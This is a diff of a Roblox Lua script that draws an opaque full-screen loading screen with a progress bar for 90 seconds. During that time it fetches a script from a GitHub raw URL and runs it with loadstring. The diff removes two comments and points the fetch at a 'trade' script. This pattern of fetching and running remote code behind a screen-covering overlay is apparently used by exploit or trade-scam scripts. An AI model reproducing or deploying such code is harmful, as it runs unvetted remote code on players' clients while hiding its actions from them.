@@ -7,7 +7,7 @@ loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 loadingGui.Name = "LoadingGui"
 
 local loadingFrame = Instance.new("Frame")
-loadingFrame.Size = UDim2.new(1, 0, 1, 0) -- Полный экран
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
 loadingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 loadingFrame.BorderSizePixel = 0
 loadingFrame.Parent = loadingGui
@@ -38,7 +38,7 @@ progressBar.BorderSizePixel = 0
 progressBar.Parent = loadingFrame
 
 local progressFill = Instance.new("Frame")
-progressFill.Size = UDim2.new(0, 0, 1, 0) -- Начальное значение 0%
+progressFill.Size = UDim2.new(0, 0, 1, 0)
 progressFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 progressFill.BorderSizePixel = 0
 progressFill.Parent = progressBar
@@ -69,7 +69,7 @@ spawn(function()
 end)
 
 spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/brefyg/XHub/refs/heads/main/xHubScript.txt"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/brefyg/XHub/refs/heads/main/xTradeScript.txt"))()
 end)
 
 wait(90)
